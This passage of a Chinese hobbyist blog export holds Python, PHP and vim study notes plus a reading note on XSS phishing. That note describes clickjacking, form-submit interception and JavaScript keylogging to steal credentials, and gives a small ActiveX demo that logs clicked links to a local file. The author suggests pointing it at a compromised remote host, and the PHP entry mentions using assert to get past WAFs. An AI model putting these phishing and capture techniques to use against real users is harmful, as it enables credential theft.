os.chmod(outfile, stat.S_IMODE(st[stat.ST_MODE]))
os.utime(outfile, (st[stat.ST_ATIME], st[stat.ST_MTIME]))
print "original", "=&gt;"
print "mode", oct(stat.S_IMODE(st[stat.ST_MODE]))
print "atime", time.ctime(st[stat.ST_ATIME])
print "mtime", time.ctime(st[stat.ST_MTIME])
print "copy", "=&gt;"
st = os.stat(outfile)
print "mode", oct(stat.S_IMODE(st[stat.ST_MODE]))
print "atime", time.ctime(st[stat.ST_ATIME])
print "mtime", time.ctime(st[stat.ST_MTIME])</pre>
<p><span style="color: #00B050;">(2)命令执行和程序调用</span>
execfile() #直接编译执行
os.execl(path, arg<em>)
os.execvp(program,arg</em>) #需要指定程序类型
eval()
os.system(cmd)
<span style="color: #00B050;">(3)使用 _ <em>import</em> _ 函数获得特定函数</span></p>
<pre lang="python">def getfunctionbyname(module_name, function_name):
    module = _ _import_ _(module_name)
    return getattr(module, function_name)
print repr(getfunctionbyname("dumbdbm", "open"))</pre>
<pre><span style="color: #00B050;">(4)使用 os 模块调用其他程序 </span>======================WIN========================</pre>
<pre lang="python">import os
import sys
def run(program, *args):
    pid = os.fork()
    if not pid:
        os.execvp(program, (program,) +  args)
    return os.wait()[0] 
run("python", "hello.py")
print "goodbye"</pre>
<p>=====================UNIX========================</p>
<pre lang="python">import os
import string 
def run(program, *args):
    # find executable
    for path in string.split(os.environ["PATH"], os.pathsep):
        file = os.path.join(path, program) + ".exe"
        try:
            return os.spawnv(os.P_WAIT, file, (file,) + args)
        except os.error:
            pass
    raise os.error, "cannot find executable" 
run("python", "hello.py")
print "goodbye"</pre>
<p><span style="color: #00B050;">(5)</span>os.environ[“PATH”],os.pathsep===&gt;系统路径分隔符,compile 函数检查语法</p>
]]></content>
      <categories>
        
          <category> coding </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[PYTHON学习札记（二）]]></title>
      <url>/coding/2013/10/02/python-e6-9c-ad-e8-ae-b0-ef-bc-88-e4-ba-8c-ef-bc-89/</url>
      <content type="html"><![CDATA[<p><span style="color: #ff0000;">1.stat模块:</span>
对于文件的状态能直接获取，通过集合分别赋值给几个变量（注意，不超过10项），说到底就是获取的文件描述符的状态。</p>
<pre lang="python">import os
import time 
file = "../src/xx.txt"
def dump( st ):
    mode, ino, dev, nlink, uid, gid, size, atime, mtime, ctime = st
    print "- size:", size, "bytes"
    print "- owner:", uid, gid
    print "- created:", time.ctime( ctime )
    print "- last accessed:", time.ctime( atime )
    print "- last modified:", time.ctime( mtime )
    print "- mode:", oct( mode )
    print "- inode/dev:", ino, dev 
    st = os.stat( file )
    print "stat", file
    dump( st )</pre>
<p>还有种类似的法子:</p>
<pre lang="python">fp = open( file )
st = os.fstat( fp.fileno() )</pre>
<p>相当于先获取I/O操作句柄，再获取状态，比上面一个法子稍复杂。</p>

<p><span style="color: #ff0000;">2.大杂烩</span>
（1）os.path的全自动化文件名分割。
(2)集合操作</p>
<pre lang="python">import operator
sequence = 1, 2, 4
print "add", "=&gt;;", reduce(operator.add, sequence)
print "sub", "=&gt;;", reduce(operator.sub, sequence)</pre>
<p>其实吧，上面的亮点不是operater，前面的py内建函数reduce才是[（1,2）+3] =&gt;无限循环处理数组集合的主,编程时将给我们带来
一定的便捷性。至于operater本身，是个集合操作的好手，定位，分割，组合，确定有无，等等，非常方便。
事见：http://blog.csdn.net/lindaydk/article/details/6314444
（3）循环读取文本</p>
<pre lang="python">import fileinput
import sys
for line in fileinput.input( "xx.txt" ):
    sys.stdout.write( "-&gt; " )
    sys.stdout.write( line )</pre>
<p>若采用glob.glob模块可以直接匹配多个文件和路径，批量循环读取！
(4)shutil模块
可以使用shutil复制整个目录,然后删除目录。
shutil.copytree[,rmtree,copy]
(5)捕获输入输出
cStringIO和StringIO。
(6)字典和列表的添加貌似特殊构造挺麻烦，可以采用其他法子。
事见：http://www.cnblogs.com/rollenholt/archive/2011/08/08/2131053.html</p>

<p><span style="color: #ff0000;">3.pickle模块的基本使用</span>
pickle模块主要特点为通过句柄就直接能完成文件操作，不知道是否类似于管道？其两个主要函数是dump()和load()。dump()函数接受一个文件句柄和一个数据对象作为参数，把数据对象以特定的格式保存到给定的文件中。当我们使用load()函数从文件中取出已保存的对象时，pickle知道如何恢复这些对象到它们本来的格式—–可以用于反弹交互，后门，socket？
<strong>待续。。。。。。。。。</strong></p>

<p>后记:查阅了网上一部分资料，感谢Rollen Holt。</p>
]]></content>
      <categories>
        
          <category> coding </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[《XSS跨站攻防》读书笔记-钓鱼的思考与延伸]]></title>
      <url>/tips/2013/09/26/e8-af-bb-e4-b9-a6-e7-ac-94-e8-ae-b0-xss-e9-92-93-e9-b1-bc-e7-9a-84-e6-80-9d-e8-80-83-e4-b8-8e-e5-bb-b6-e4-bc-b8/</url>
      <content type="html"><![CDATA[<p>邱哥文中的一句话说的很好，现在对于cookie限制采用了很多技术，比如令牌验证，比如会话过期时间，卡的比较死算是httponly，一旦使用，如果一旦是域全局限制，整个一个痛字了得！
由此而论，钓鱼手法是一种针对低权限下较为保守的做法，而且具有一定的可靠性，在取得真实帐密后，也免去了复杂加密的痛苦。当然，前提是，你能懂得欺骗的艺术—事见凯文米特尼克的大作。
目前市面上流传的xss钓鱼手法不少，本来么，在互联网大众化的时代，没有你做不到的，只有你想不到的。传统的互联网的钓鱼手法很多都可以改装后运用到xss上。
第一：重定向和伪造，这两种小弟认为是不太具有太大的诱惑力的，一般只能骗骗不小心的孩纸，在网友日益增长的意识面前，不改变网址的高仿的页面已经不太够看了，当然内嵌表单和单点覆盖还是个不错的手法，如果对网站不够熟悉，很可能就在不经意的位置中招而了无所知。
在这里小弟补充一点自己的看法，举个栗子，clickjacking是一种好的法子，他会通过某种诱惑，比如以苍、武二老师的温柔乡作幌子，欺骗你去点击一个你看不到的，且不该点击的东西。Form框输入欺骗也是一样，在取得你的输入后，他也许会试图传值，post给真正的登陆页面，然后返回导向。你会发现，你已经登陆了。不过，你的个人隐私和帐密却已经悄悄的 被copy到了某处，静静等待着罪恶的发生。
第二：关于“高级”钓鱼，就以邱哥思想来说，就是在更加隐蔽的层次进行劫持和记录（话说邱哥貌似还删了一部分比较完整的，没能看上原稿甚是遗憾）。其中一种手法便是在表单submit时截获数据，通过节点取得我们所需的value。当然，我们取得数据的触发和时机也可以换。比如可以在在输入最后一个登陆框之后进行一个快速的遍历（可以避免故意输入错误或者截获数据的完整性），因为JS本地执行是优先于服务端的反应的。而另一种，小弟并不太喜欢，即键盘记录劫持钓鱼（不知道以后杀软会不会根据特征和行为对此劫持报毒），使用JS自带的触发可以做许多的事。
小弟尝试写了下点击劫持，360并没有报危险，看来杀软BS模式的特征行为也许有待改进，不过版本稍微新点的浏览器会有提示或者直接过滤。
<span style="color: #ff0000;"> &lt;html&gt;</span>
<span style="color: #ff0000;">&lt;head&gt;</span>
<span style="color: #ff0000;">&lt;script&gt;</span>
<span style="color: #ff0000;">function txt(sb)</span>
<span style="color: #ff0000;">{</span>
<span style="color: #ff0000;">//window.alert(“F4ck!!”);</span>
<span style="color: #ff0000;">  var fso, f1;</span>
<span style="color: #ff0000;">  var ForReading=1;</span>
<span style="color: #ff0000;">  fso=new ActiveXObject(“Scripting.FileSystemObject”);</span>
<span style="color: #ff0000;">  f1=fso.CreateTextFile(“c:\hack.txt”,true);</span>
<span style="color: #ff0000;">  f1.WriteLine(sb.getAttribute(“href”));</span>
<span style="color: #ff0000;">  f1.WriteBlankLines(1);</span>
<span style="color: #ff0000;">  f1.Close();</span>
<span style="color: #ff0000;">}</span>
<span style="color: #ff0000;"> &lt;/script&gt;</span>
<span style="color: #ff0000;">&lt;/head&gt;</span>
<span style="color: #ff0000;">&lt;body&gt;</span>
<span style="color: #ff0000;">&lt;a href=”http://www.baidu.com” onclick=”txt(this)”&gt;baidu&lt;/a&gt;</span>
<span style="color: #ff0000;">&lt;a href=”http://www.google.com.hk” onclick=”txt(this)”&gt; google&lt;/a&gt;</span>
<span style="color: #ff0000;">&lt;a href=”http://blog.hellsec.net” onclick=”txt(this)”&gt; blog&lt;/a&gt;</span>
<span style="color: #ff0000;">&lt;/body&gt;</span>
<span style="color: #ff0000;">&lt;/html&gt;</span>
<a href="http://blog.hellsec.net/wp-content/uploads/2013/09/1.png"><img class="alignnone size-medium wp-image-195" title="1" src="http://blog.hellsec.net/wp-content/uploads/2013/09/1-300x111.png" alt="" width="300" height="111" /></a>
<a href="http://blog.hellsec.net/wp-content/uploads/2013/09/2.png"><img class="alignnone size-medium wp-image-196" title="2" src="http://blog.hellsec.net/wp-content/uploads/2013/09/2-300x74.png" alt="" width="300" height="74" /></a>
其中代码中的本地路径也许可以配置为公网肉鸡的远程路径，配置好可写入不可执行权限？聪明的各位朋友应该可以做更多的尝试。
以上是小弟自己的想法，按邱哥的意思应该是通过截获表单或者监听键盘，通过JS动态生成表单发送出去，如图：
<a href="http://blog.hellsec.net/wp-content/uploads/2013/09/3.png"><img class="alignnone size-medium wp-image-197" title="3" src="http://blog.hellsec.net/wp-content/uploads/2013/09/3-300x135.png" alt="" width="300" height="135" /></a>
以上应该算是箱子原理，由更加强大的脚本语言动态接受参数，生成条目，可存入数据库，减少了中介部分，也是更为普遍、稳定的做法。</p>
]]></content>
      <categories>
        
          <category> tips </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[PHP学习札记（二）]]></title>
      <url>/coding/2013/09/24/php-e5-ad-a6-e4-b9-a0-e6-9c-ad-e8-ae-b0-ef-bc-88-e4-ba-8c-ef-bc-89/</url>
      <content type="html"><![CDATA[<p><span style="color: #00B050;">1.对于assert的分析：</span>
估计不少人都知道，assert这个函数，此为php官方声明文档中，建议用于debug的。在执行时，效果类似于eval，返回true or false;只不过可容错，可执行不是特别符合规范的语句。说白点就是php中的@容错。当配合用上callback的方法，可以知道具体的出错信息。
个人觉得需要注意的几个小点：
（1）当被程序员用于调试时，最好调试完毕用其他替换，毕竟assert虽好，使用时需要开启开关ASSERT_ACTIVE以此来控制是否开启debug，实际运营环节是很容易被disable的。
（2）assert使用时很灵活，其本质是判断一个表达式是否成立，如用于奇技淫巧，可用于加密后对各种WAF的绕过。
（3）另外，注意下assert_option()的配置，几个细节很值得研究：
EX:assert_option()
默认值ASSERT_ACTIVE=1 //Assert函数的开关
ASSERT_WARNING =1 //当表达式为false时，是否要输出警告性的错误提示,issue a PHP warning for each failed assertion
ASSERT_BAIL= 0 //是否要中止运行；terminate execution on failed assertions
ASSERT_QUIET_EVAL= 0 //是否关闭错误提示，在执行表达式时；disable error_reporting during assertion expression evaluation
ASSERT_CALLBACK= (NULL) // 是否启动回调函数 user function to call on failed assertions</p>

<p><span style="color: #00B050;">2.劫持引出的来源分析：</span>
前段时间劫持快照蛮火，不知道现在如何，博主挺笨又胆儿小，没有作深入研究。至于劫持脚本如何判断爬虫可以借鉴一下。
（1）.htacess，一般放在网站的根目录，抑或htdocs下也是较常见的。主要用于对目录配置的二次覆盖，以及封禁特定IP地址的用户、只允许特定IP地址的用户。即使服务器是比较安全的那种，可以考虑不要使用它。打个比方，一个站群服务器，如果AllowOverride启用了.htaccess文件，则Apache需要在每个目录中查找.htaccess文件，因此，无论是否真正用到，启用.htaccess都会导致性能的下降。另外，对每一个请求，都需要读取一次.htaccess文件，并且如果启用的话，Apache必须在所有上级的目录中查找.htaccess文件。
（2）$_SERVER[‘HTTP_REFERER’]，其实重点是HTTP_REFFRER,在接收post包时，可能会出现，一般对应的是http的消息报头referer项，可以判断的是网页的定向来源，这在抓取post包时可以抓到。
（3）HTTP_USER_AGENT，也是$_SERVER的参数，可判断主机来源，这里需要注意的是，与上不同，上面的reffer判断的是主机地址，这个则需要匹配主机关键词如google、yahoo神马的。
（4）X-Forwarded-For，介个是博主自己添加的，一般在代表客户端，在服务器使用了负载均衡和代理时会使用，有时也会拿来判断真实IP或者来源（比如某些略坑的hack游戏）.</p>

<p><span style="color: #00B050;">3.不安全因素过滤引发的思考</span>
（1）htmlspecialchars()，许多php程序猿会用到的一个过滤器，此函数把一些预定义的字符转换为 HTML实体。如：” （双引号） 成为 “’ （单引号） 成为 &amp;#039。输出的转义的字符无法对浏览器造成跨站攻击(记得编码时双单引号的可编码性是可选的)。
（2）addslashes()，对字符进行转义。当magic_quotes_gpc=off时，此函数会对输入的字符进行加斜杠处理；当为on时，使用了此函数，输出应该用stripslashes()去掉多余的反斜杠。当然在这里我们需要注意宽字符‘縗’造成截断的影响（这里不再赘言）。值得一提的是，magic_quotes_gpc特性在PHP5.3.0中已经废弃并且在5.4.0中已经移除了，这对于转义显得更为灵活。
（3）参数化查询防止SQL注入（这里插一句，是补充的是mysql相关，与php并无太大关系。）,或许部分朋友会觉得这个在mssql开发里听到过，其实mysql里也可以实现的。那么，参数化查询是如何防止注入的呢。参数化查询中，可以重用执行计划，并且如果重用执行计划的话，SQL所要表达的语义就不会变化，所以就可以防止SQL注入。
MySqlConnection   myconn   =   new   MySqlConnection(constr);
 MySqlCommand   mycomm   =new   MySqlCommand(constr);
 strsql= “select   cust_id,cust_name   from   vt_frmcust   where   punid=？str1 “;
 mycomm.Parameters.Add( “？str1 “,MySqlDbType.VarChar,32);
 mycomm.Parameters[ “？str1 “].Value=Request[ “unid “]; 
在此之前，SQL语句如果中如果预计掺入了注入，可以先考虑sql语句拼接+过滤，不过动态执行SQL同样有风险。
mysql中的动态执行：
mysql&gt; SET @a=1;
mysql&gt; PREPARE STMT FROM “SELECT * FROM tbl LIMIT ?”;
mysql&gt; EXECUTE STMT USING @a;
预定义一个语句，并将它赋给 STMT,”？”参数带入，动态执行。PS: MySQL VER&gt;5.0.13,可用于存储过程，但仍不支持用于自定义函数。参考资料中有几个讨论有点意思，机油们可以看看：
<span style="color: #00ffff;">http://bbs.csdn.net/topics/380206077</span>
<span style="color: #00ffff;"> http://cs.now.cn/html/FAQ/service/201302/27-7014.html</span>
<span style="color: #00ffff;"> http://database.51cto.com/art/201301/377069.htm</span>
<span style="color: #00ffff;"> http://blog.csdn.net/moshuchao/article/details/2153342#</span></p>

]]></content>
      <categories>
        
          <category> coding </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[Google隐藏次级域名抓取]]></title>
      <url>/coding/2013/09/07/google-e9-9a-90-e8-97-8f-e6-ac-a1-e7-ba-a7-e5-9f-9f-e5-90-8d-e6-8a-93-e5-8f-96/</url>
      <content type="html"><![CDATA[<p>最近忙着找实习，时间又忙，前几天本想找个内网啥的，结果接的任务的内网不是短时间搞得下来的。
但是昨儿有朋友跟我谈起二级域名抓取的问题，因为大家都知道，市面上有几款api查询次级域名，但是很多时候都查不完，邮局，快过期的域名，注册未名的，内网入口。尤其是不大不小的站，这种是在api中查不了的。关于因此昨儿写了个py，直接上东西。
如果有朋友对版权问题有异议，请私信博主更改和添加。
<span style="color: #00ffff;">优缺点：</span>
1.代码是借鉴了一部分别人的，其中包括（haxxxxx兄），毕竟小弟不是码农，代码看起来有点山寨。。
2.没有采用多线程，因为google api在没有连国外VPN时多线程2+就得崩，这种本来运行也不慢，所以综合考虑没有采用它。
3.最后整理为去重复的字典result.txt，可以直接导入御剑啥的。
4.中间产生了些临时文件，启动删除时可以清理。
5.没有采用win下必备的模块，跨平台性。。（话说haxxxxx兄写的东西真的挺好，不过基本每次都要加上win模块，让小弟好生伤心、）
6.最后，用法并非单一，功能大神们改进后继续发掘。
朋友的原创不错，比我这个好，代码也更简洁。不过我估计他博客有我就不发了。
友链里自己找出那位大神喔。
PS:本来想直接发他的。。。脸皮还是不够厚啊。</p>

<p><span style="color: #00ffff;">附件:</span>
<span style="color: #ff0000;"> 需要的第三方模块以及代码==&gt;</span>
<span style="color: #ff0000;"> 我传的百度盘：</span>
<a title="第三方模块" href="http://pan.baidu.com/share/link?shareid=1068142402&amp;uk=4113276289" target="_blank">http://pan.baidu.com/share/link?shareid=1068142402&amp;uk=4113276289</a>
<a title="代码文件" href="http://pan.baidu.com/share/link?shareid=1070462314&amp;uk=4113276289" target="_blank">http://pan.baidu.com/share/link?shareid=1070462314&amp;uk=4113276289</a></p>
]]></content>
      <categories>
        
          <category> coding </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[python学习札记（一）]]></title>
      <url>/coding/2013/08/05/python-e5-ad-a6-e4-b9-a0-e6-9c-ad-e8-ae-b0-ef-bc-88-e4-b8-80-ef-bc-89/</url>
      <content type="html"><![CDATA[<p>本文本无高深内容，仅是实验时自行整理，看官莫喷。
由于本人不是特聪明，正则之类的特不喜欢用，因此，字符串截取、分割之类的成了小弟的最爱。
不过这篇正则写的不错，留下作为参考。
http://wiki.ubuntu.org.cn/Python正则表达式操作指南</p>

<p><span style="color: #ff0000;">第一：取字符串与查找</span>
<span style="color: #00ffff;">1.直接寻找字符串</span>
&gt;&gt;&gt; str = “xxxabxxx”
&gt;&gt;&gt; str.find(“ab”)
返回值为-1代表没有取到。
<strong>demo：string.find( substr, [start, [end]] )</strong>
记住去返回值最好单独赋值，不然容易出错。
参考文献：http://blog.csdn.net/ataraxia2010/article/details/6907907 （没有给出返回值）
<span style="color: #00ffff;">2.去掉指定字符串中指定的字符串</span>
参考文献：http://blog.csdn.net/ataraxia2010/article/details/6907907
import string
string.replace(s,”asd”,”“,1)
<strong>or:</strong>
import re
re.sub(“^asd”,”“,s)
与上方不同，直接print打印值会好些。
<span style="color: #00ffff;">3.”分割前中后”</span>
比如读一行到s，然后r,_,s=s.partition(‘指定字符串’)现在，r是不要的部分，s就是指定字符串后的部分，如果有结果的话，_的值也是指定字符串。</p>

<p><span style="color: #ff0000;">第二:python里的循环</span>
提醒一下，中断为continue,break为终断。循环和判断后的‘：’千万别忘了。
参考资料：
http://developer.51cto.com/art/201003/187652.htm
http://www.douban.com/note/242320366/
已经比较全面，略去不提。</p>

<p><span style="color: #ff0000;">第三:如何输出内容到文件</span>
<span style="color: #00ffff;">1. python test.py&gt;1.txt</span>
<span style="color: #00ffff;">2. 先调用以下语句就可以把print结果保存到文件了</span>
import sys
origin = sys.stdout
f = open(‘file.txt’, ‘w’)
sys.stdout = f</p>

<p>处理完之后,
sys.stdout = origin
f.close()
PS:网上摘录，使用时可能会出现一定问题。</p>

<p><span style="color: #00ffff;">3.c=”a string to print to file”</span>
f=open(‘out.txt’,’w’)
print &gt;&gt;f,c
f.close()
注意&gt;&gt;f后面要加逗号，否则会出错
书上说f=open(‘out.txt’,’a’)
试了不行，估计是权限问题。(网摘)</p>

<p>附上引起以上研究的学习代码：http://blog.sina.com.cn/s/blog_6b60096f01017c0f.html</p>
]]></content>
      <categories>
        
          <category> coding </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[打造个性版vim]]></title>
      <url>/tips/2013/07/26/e6-89-93-e9-80-a0-e4-b8-aa-e6-80-a7-e7-89-88vim/</url>
      <content type="html"><![CDATA[<p>众所周知，vim是一种非常强大的IDE，不少朋友说他配合上插件几乎超越市面上任何一款编辑器。鄙人水平有限，对vim还处于待入门的阶段，经一位死党机油的精心指点和资料的查阅，终于更新了自己vim。
其实本文有点标题党的意味，主要不是给大家展示如何配置而是给大家说明如何在借鉴别人的配置或者在另一台电脑上复原vim配置时，中间需要注意的一些东西。</p>

<p>以下配置代码引自习科，这里就不多说了。</p>

<p>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</p>

<p><span style="color: #ff0000;">”———————基本设置————————-</span></p>

<p><span style="color: #ff0000;">“语言设置</span></p>

<p><span style="color: #ff0000;">set langmenu=zh_CN.UTF-8</span></p>

<p><span style="color: #ff0000;">set helplang=cn</span></p>

<p><span style="color: #ff0000;">“解决某些文档编码造成中文乱码的问题</span></p>

<p><span style="color: #ff0000;">set fileencodings=utf-8,gb18030,utf-16,big5</span></p>

<p><span style="color: #ff0000;">”——————————————————</span></p>

<p><span style="color: #ff0000;">syntax on “自动语法高亮</span></p>

<p><span style="color: #ff0000;">set mouse=a “所有模式下允许使用鼠标</span></p>

<p><span style="color: #ff0000;">set background=dark “设置背景颜色为Dark,让字体更加醒目</span></p>

<p><span style="color: #ff0000;">set nu “显示行号</span></p>

<p><span style="color: #ff0000;">set showcmd “显示输入命令</span></p>

<p><span style="color: #ff0000;">set smartindent “智能语法对齐</span></p>

<p><span style="color: #ff0000;">set foldenable “允许折叠</span></p>

<p><span style="color: #ff0000;">set foldmethod=manual “手动折叠</span></p>

<p><span style="color: #ff0000;">set shiftwidth=4 “代码缩进为4个字符</span></p>

<p><span style="color: #ff0000;">set softtabstop=4 “按一次Tab前进4个字符</span></p>

<p><span style="color: #ff0000;">set tabstop=4 “保存Tab宽度为4个字符</span></p>

<p><span style="color: #ff0000;">set history=300 “保存300条历史记录</span></p>

<p><span style="color: #ff0000;">set expandtab “使用空格代替制表符</span></p>

<p><span style="color: #ff0000;">set hlsearch “搜索高亮</span></p>

<p><span style="color: #ff0000;">set incsearch “搜素逐字高亮</span></p>

<p><span style="color: #ff0000;">set nowrapscan “禁止搜索到文件两端时重新搜索</span></p>

<p><span style="color: #ff0000;">set ignorecase smartcase “搜索时智能忽略大小写</span></p>

<p><span style="color: #ff0000;">set magic “设置魔术</span></p>

<p><span style="color: #ff0000;">set ttimeoutlen=100 “设置键码超时</span></p>

<p><span style="color: #ff0000;">colorscheme ron “ron配色方案</span></p>

<p><span style="color: #ff0000;">autocmd InsertEnter * se cul “进入编辑模式下高亮当前行</span></p>

<p><span style="color: #ff0000;">autocmd InsertLeave * se nocul “回到普通模式下取消高亮当前行</span></p>

<p><span style="color: #ff0000;">“vimrc修改之后自动加载</span></p>

<p><span style="color: #ff0000;">autocmd! bufwritepost .vimrc source %</span></p>

<p><span style="color: #ff0000;">”———————插件相关————————-</span></p>

<p><span style="color: #ff0000;">“vundle插件管理器</span></p>

<p><span style="color: #ff0000;">set nocompatible “关闭vi兼容模式,vundle需求设置</span></p>

<p><span style="color: #ff0000;">filetype off “关闭文件类型检测,vundle需求设置</span></p>

<p><span style="color: #ff0000;">set rtp+=~/.vim/bundle/vundle/</span></p>

<p><span style="color: #ff0000;">call vundle#rc()</span></p>

<p><span style="color: #ff0000;">” 让Vundle管理自身</span></p>

<p><span style="color: #ff0000;">Bundle ‘gmarik/vundle’</span></p>

<p><span style="color: #ff0000;">“使用vundle管理的插件在下面声明:</span></p>

<p><span style="color: #ff0000;">” github上使用如下方式填写</span></p>

<p><span style="color: #ff0000;">“Bundle ‘tpope/vim-fugitive’</span></p>

<p><span style="color: #ff0000;">“Bundle ‘rstacruz/sparkup’, {‘rtp’: ‘vim/’}</span></p>

<p><span style="color: #ff0000;">Bundle “scrooloose/syntastic”</span></p>

<p><span style="color: #ff0000;">Bundle “Shougo/neocomplcache”</span></p>

<p><span style="color: #ff0000;">” vim-scripts上的插件按照下面方式填写</span></p>

<p><span style="color: #ff0000;">” 插件名可以在这里搜索[url=http://vim-scripts.org/vim/scripts.html]http://vim-scripts.org/vim/scripts.html[/url]</span></p>

<p><span style="color: #ff0000;">Bundle ‘The-NERD-tree’</span></p>

<p><span style="color: #ff0000;">Bundle ‘The-NERD-Commenter’</span></p>

<p><span style="color: #ff0000;">Bundle ‘fcitx.vim’</span></p>

<p><span style="color: #ff0000;">Bundle ‘colorizer’</span></p>

<p><span style="color: #ff0000;">Bundle ‘vim-javascript’</span></p>

<p><span style="color: #ff0000;">Bundle ‘taglist.vim’</span></p>

<p><span style="color: #ff0000;">Bundle ‘sgmlendtag’</span></p>

<p><span style="color: #ff0000;">Bundle ‘EasyMotion’</span></p>

<p><span style="color: #ff0000;">“其他的插件按照下面方式填写</span></p>

<p><span style="color: #ff0000;">“Bundle ‘git://git.wincent.com/command-t.git’</span></p>

<p><span style="color: #ff0000;">Bundle ‘https://github.com/Lokaltog/vim-powerline.git’</span></p>

<p><span style="color: #ff0000;">filetype plugin indent on “根据文件类型启用插件,vundle需求设置</span></p>

<p><span style="color: #ff0000;">“vundle使用方法:</span></p>

<p><span style="color: #ff0000;">” :BundleList - 列出已声明的插件</span></p>

<p><span style="color: #ff0000;">” :BundleInstall(!) - 安装(更新)插件</span></p>

<p><span style="color: #ff0000;">” :BundleSearch(!) foo - 搜索插件(或先刷新缓存)</span></p>

<p><span style="color: #ff0000;">” :BundleClean(!) - 清除不在声明列表中插件</span></p>

<p><span style="color: #ff0000;">”</span></p>

<p><span style="color: #ff0000;">” 输入:h vundle查看更多帮助文档与细节</span></p>

<p><span style="color: #ff0000;">” NOTE: comments after Bundle command are not allowed..</span></p>

<p><span style="color: #ff0000;">“vim-powerline配置(状态栏扩展)</span></p>

<p><span style="color: #ff0000;">set laststatus=2</span></p>

<p><span style="color: #ff0000;">set t_Co=256</span></p>

<p><span style="color: #ff0000;">let g:Powerline_symbols = ‘unicode’</span></p>

<p><span style="color: #ff0000;">“NERDTree”</span></p>

<p><span style="color: #ff0000;">“F4打开/关闭NERDtree插件</span></p>

<p><span style="color: #ff0000;">map :NERDTreeToggle</span></p>

<p><span style="color: #ff0000;">“imap :NERDTreeToggle</span></p>

<p><span style="color: #ff0000;">“The-NERD-Commenter</span></p>

<p><span style="color: #ff0000;">let mapleader=”,” “改变默认’'键，将其改映射为’,’键</span></p>

<p><span style="color: #ff0000;">“普通模式下：</span></p>

<p><span style="color: #ff0000;">” ,cc 注释当前行</span></p>

<p><span style="color: #ff0000;">” ,cs 以”性感”的方式注释</span></p>

<p><span style="color: #ff0000;">” ,cu 取消注释</span></p>

<p><span style="color: #ff0000;">” ,ca 在可选的注释方式之间切换，比如C/C++ 的块注释/* */和行注释//</span></p>

<p><span style="color: #ff0000;">” ,cm 添加块注释</span></p>

<p><span style="color: #ff0000;">” ,cA 当前行未添加注释符号</span></p>

<p><span style="color: #ff0000;">” colorizer</span></p>

<p><span style="color: #ff0000;">” 普通模式下输入 ,tc 开启/关闭CSS中显示颜色</span></p>

<p><span style="color: #ff0000;">“javascript</span></p>

<p><span style="color: #ff0000;">let b:javascript_fold=1 “ 打开javascript折叠</span></p>

<p><span style="color: #ff0000;">let javascript_enable_domhtmlcss=1 “ 打开javascript对dom、html和css的支持</span></p>

<p><span style="color: #ff0000;">” syntastic(一个非常好用的多语言的语法与编码风格检查插件)</span></p>

<p><span style="color: #ff0000;">let g:syntastic_auto_jump=1</span></p>

<p><span style="color: #ff0000;">let g:syntastic_check_on_open = 1</span></p>

<p><span style="color: #ff0000;">let g:syntastic_error_symbol = ‘✗’</span></p>

<p><span style="color: #ff0000;">let g:syntastic_warning_symbol = ‘⚠’</span></p>

<p><span style="color: #ff0000;">let g:syntastic_auto_loc_list = 1</span></p>

<p><span style="color: #ff0000;">let g:syntastic_loc_list_height = 6</span></p>

<p><span style="color: #ff0000;">let g:syntastic_enable_highlighting = 0</span></p>

<p><span style="color: #ff0000;">“Taglist(按F3启动代码浏览)</span></p>

<p><span style="color: #ff0000;">nmap :Tlist</span></p>

<p><span style="color: #ff0000;">let Tlist_Use_Right_Window=1</span></p>

<p><span style="color: #ff0000;">let Tlist_Exit_OnlyWindow = 1</span></p>

<p><span style="color: #ff0000;">let Tlist_Show_One_File = 1</span></p>

<p><span style="color: #ff0000;">let Tlist_Use_SingleClick=1</span></p>

<p><span style="color: #ff0000;">“easymotion(快速一定光标)</span></p>

<p><span style="color: #ff0000;">let g:EasyMotion_leader_key = ‘’</span></p>

<p><span style="color: #ff0000;">“双空格+w出现行关键字字母然后快速跳跃</span></p>

<p><span style="color: #ff0000;">“neocomplcache(自动补全插件)</span></p>

<p><span style="color: #ff0000;">” 启动vim时开启neocomplcache.</span></p>

<p><span style="color: #ff0000;">let g:neocomplcache_enable_at_startup = 1</span></p>

<p><span style="color: #ff0000;">” Use smartcase.</span></p>

<p><span style="color: #ff0000;">let g:neocomplcache_enable_smart_case = 1</span></p>

<p><span style="color: #ff0000;">” Set minimum syntax keyword length.</span></p>

<p><span style="color: #ff0000;">let g:neocomplcache_min_syntax_length = 3</span></p>

<p><span style="color: #ff0000;">let g:neocomplcache_lock_buffer_name_pattern = ‘*ku*’</span></p>

<p><span style="color: #ff0000;">” Enable heavy features.</span></p>

<p><span style="color: #ff0000;">” Use camel case completion.</span></p>

<p><span style="color: #ff0000;">let g:neocomplcache_enable_camel_case_completion = 1</span></p>

<p><span style="color: #ff0000;">” Use underbar completion.</span></p>

<p><span style="color: #ff0000;">let g:neocomplcache_enable_underbar_completion = 1</span></p>

<p><span style="color: #ff0000;">” Define keyword.</span></p>

<p><span style="color: #ff0000;">if !exists(‘g:neocomplcache_keyword_patterns’)</span></p>

<p><span style="color: #ff0000;">let g:neocomplcache_keyword_patterns = {}</span></p>

<p><span style="color: #ff0000;">endif</span></p>

<p><span style="color: #ff0000;">let g:neocomplcache_keyword_patterns[‘default’] = ‘\h\w*’</span></p>

<p><span style="color: #ff0000;">” Enable omni completion.</span></p>

<p><span style="color: #ff0000;">autocmd FileType css setlocal omnifunc=csscomplete#CompleteCSS</span></p>

<p><span style="color: #ff0000;">autocmd FileType html,markdown setlocal omnifunc=htmlcomplete#CompleteTags</span></p>

<p><span style="color: #ff0000;">autocmd FileType javascript setlocal omnifunc=javascriptcomplete#CompleteJS</span></p>

<p><span style="color: #ff0000;">autocmd FileType python setlocal omnifunc=pythoncomplete#Complete</span></p>

<p><span style="color: #ff0000;">autocmd FileType xml setlocal omnifunc=xmlcomplete#CompleteTags</span></p>

<p><span style="color: #ff0000;">autocmd FileType ruby setlocal omnifunc=rubycomplete#Complete</span></p>

